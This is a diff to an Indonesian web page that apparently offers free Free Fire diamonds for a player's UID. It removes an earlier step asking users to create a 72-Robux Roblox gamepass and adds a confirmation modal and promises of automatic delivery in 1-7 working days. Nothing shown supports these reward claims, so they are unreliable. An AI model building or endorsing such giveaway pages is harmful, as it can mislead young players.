@@ -874,8 +874,8 @@
     <div class="modal-title">Konfirmasi Klaim</div>
     <div class="modal-msg" id="modalMsg">Pastikan data kamu sudah benar!</div>
     <div class="modal-btns">
-      <button class="modal-btn-yes" id="modalBtnYes" onclick="konfirmasiYes()" disabled>(<span id="modalCount">3</span>) Sudah</button>
-      <button class="modal-btn-no" onclick="tutupModal()">Belum</button>
+      <button class="modal-btn-yes" id="modalBtnYes" onclick="konfirmasiYes()" disabled>(<span id="modalCount">3</span>) Ya, UID Benar</button>
+      <button class="modal-btn-no" onclick="tutupModal()">Batal</button>
     </div>
   </div>
 </div>
@@ -889,14 +889,12 @@
     <label id="checkboxLabel" style="display:flex;align-items:flex-start;gap:10px;background:var(--bg);border:2px solid var(--border);border-radius:12px;padding:13px 14px;margin-bottom:18px;cursor:pointer;transition:border-color .2s;">
       <input type="checkbox" id="checkKlaim" onchange="toggleModal2Btn()"
         style="width:20px;height:20px;min-width:20px;accent-color:var(--primary);cursor:pointer;margin-top:1px;" />
-      <span id="checkLabel" style="font-size:13px;font-weight:700;color:var(--text);line-height:1.5;">
-        Saya setuju dengan syarat dan ketentuan yang berlaku
-      </span>
+      <span style="font-size:13px;font-weight:700;color:var(--text);line-height:1.5;">Saya setuju dan memahami bahwa diamond akan dikirim dalam 1-7 hari kerja</span>
     </label>
     <div class="modal-btns">
       <button class="modal-btn-yes" id="modal2BtnYes" onclick="konfirmasiYes2()" disabled
-        style="background:linear-gradient(135deg,#00c853,#00e676);opacity:.45;cursor:not-allowed;"><i class="fa-solid fa-circle-check ic-green"></i> Ya, sudah dibuat!</button>
-      <button class="modal-btn-no" onclick="tutupModal2()">Belum jadi</button>
+        style="background:linear-gradient(135deg,#00c853,#00e676);opacity:.45;cursor:not-allowed;"><i class="fa-solid fa-circle-check ic-green"></i> Klaim Sekarang!</button>
+      <button class="modal-btn-no" onclick="tutupModal2()">Batal</button>
     </div>
   </div>
 </div>
@@ -984,11 +982,11 @@
     </div>
     <div class="ck-step">
       <div class="ck-icon"><i class="fa-solid fa-gamepad ic-amber"></i></div>
-      <div><div class="ck-title">2. Buat Gamepass</div><div class="ck-desc">Buat Gamepass di game Roblox kamu seharga 72 Robux. Ikuti tutorial lengkap yang kami sediakan.</div></div>
+      <div><div class="ck-title">2. Proses Otomatis</div><div class="ck-desc">Sistem akan memproses klaim diamond kamu secara otomatis.</div></div>
     </div>
     <div class="ck-step" style="margin-bottom:0;">
       <div class="ck-icon"><i class="fa-solid fa-gem ic-cyan"></i></div>
-      <div><div class="ck-title">3. Dapat Diamond!</div><div class="ck-desc">Setiap pemain yang beli Gamepass → kamu otomatis dapat Diamond. Masuk dalam 7-10 hari kerja!</div></div>
+      <div><div class="ck-title">3. Diamond Dikirim!</div><div class="ck-desc">Diamond akan dikirim ke akun Free Fire kamu dalam 1-7 hari kerja.</div></div>
     </div>
   </div>
 
@@ -1403,11 +1401,11 @@
 
   // ===== SMOOTH SHOW =====
   // Urutan step untuk menentukan arah swipe
-  const CARD_ORDER = { s1:0, sRequest:1, sRequestDone:2, sRateLimit:1, sRateLimitDone:2, s2:1, s3:2, sEventWin:2 };
-  const CARDS = ['s1','s2','s3','sRequest','sRequestDone','sRateLimit','sRateLimitDone','sEventWin'];
+  const CARD_ORDER = { s1:0, sRequest:1, sRequestDone:2, sRateLimit:1, sRateLimitDone:2, s3:1, sEventWin:1 };
+  const CARDS = ['s1','s3','sRequest','sRequestDone','sRateLimit','sRateLimitDone','sEventWin'];
 
   // Cards yang menyembunyikan frontContent
-  const FRONT_HIDDEN_FOR = new Set(['s2','s3','sEventWin','sRateLimit','sRateLimitDone']);
+  const FRONT_HIDDEN_FOR = new Set(['s3','sEventWin','sRateLimit','sRateLimitDone']);
 
   function show(id) {
     const current = CARDS.find(c => !document.getElementById(c).classList.contains('hidden'));
@@ -1451,7 +1449,7 @@
   function updateTutorial(diamond, _unused, isEvent) {
     
     document.getElementById('tutorialAlert').innerHTML = `Kamu akan dapat <strong>${diamond} 💎</strong>`;
-    document.getElementById('showUserSub').innerHTML = isEvent ? `<i class="fa-solid fa-bolt ic-yellow"></i> Klaim Event ${robux} Robux` : '<i class="fa-solid fa-circle-check ic-green"></i> Siap Klaim 💎';
+    document.getElementById('showUserSub').innerHTML = isEvent ? '<i class="fa-solid fa-bolt ic-yellow"></i> Klaim Event 💎' : '<i class="fa-solid fa-circle-check ic-green"></i> Siap Klaim 💎';
   }
 
   function startS2Countdown() {
@@ -1481,13 +1479,9 @@
   function tutupModal() { document.getElementById('modalKonfirmasi').classList.add('hidden'); if(_step2Resolve){_step2Resolve(false);_step2Resolve=null;} }
   function konfirmasiYes() {
     document.getElementById('modalKonfirmasi').classList.add('hidden');
-    // Reset checkbox & tombol sebelum buka modal 2
     document.getElementById('checkKlaim').checked = false;
     const btn2 = document.getElementById('modal2BtnYes');
     btn2.disabled = true; btn2.style.opacity = '.45'; btn2.style.cursor = 'not-allowed';
-    // Isi harga di label checkbox
-    const harga = document.getElementById('tutorialHarga').textContent;
-    document.getElementById('checkHarga').textContent = harga;
     document.getElementById('modalKonfirmasi2').classList.remove('hidden');
   }
   function toggleModal2Btn() {
@@ -1504,16 +1498,7 @@
   }
   function konfirmasiYes2() {
     document.getElementById('modalKonfirmasi2').classList.add('hidden');
-    // Buka modal 3 — quiz harga gamepass
-    const hargaEl = document.getElementById('tutorialHarga');
-    const harga = parseInt((hargaEl ? hargaEl.textContent : '72').replace(/[^0-9]/g,'')) || 72;
-    bukaModal3(harga).then(benar => {
-      if (benar) {
-        if (_step2Resolve) { _step2Resolve(true); _step2Resolve = null; }
-      } else {
-        // Batal — biarkan user di step 2
-      }
-    });
+    if (_step2Resolve) { _step2Resolve(true); _step2Resolve = null; }
   }
 
   // ===== AVATAR =====
@@ -1631,7 +1616,9 @@
     const cek = await window._cekUsername(val);
     if (cek.status === 'exists') { hideLoading(); show('sRequest'); return; }
     localStorage.setItem('ff_username', val);
-    // Langsung proses klaim (tidak ada step 2)
+    // Tampilkan modal konfirmasi dulu
+    const konfirmasi = await bukaModal();
+    if (!konfirmasi) return;
     showLoading('Memproses klaim...');
     const diamondJumlah = window._normalDiamond || 100;
     if (window._saveKlaim) await window._saveKlaim(state.username, state.userId, state.avatarUrl, diamondJumlah, false);
